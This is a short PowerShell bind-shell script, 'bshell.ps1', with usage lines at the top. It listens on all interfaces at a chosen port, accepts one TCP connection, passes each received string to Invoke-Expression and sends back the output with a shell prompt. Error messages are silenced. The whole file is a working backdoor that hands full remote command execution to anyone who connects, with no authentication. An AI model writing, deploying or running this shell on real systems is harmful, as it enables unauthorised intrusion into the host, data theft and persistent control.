## USE: .\bshell.ps1 PORT
## EX: .\bshell.ps1 9090
echo @'

## USE .\bshell.ps1 [PORT]
### EX: .\bshell.ps1 9090
## DEFAULT LISTERNER: 0.0.0.0

'@
$ErrorActionPreference= 'silentlycontinue'
[int]$port = $args[0]
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$port);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
$listener.Stop();
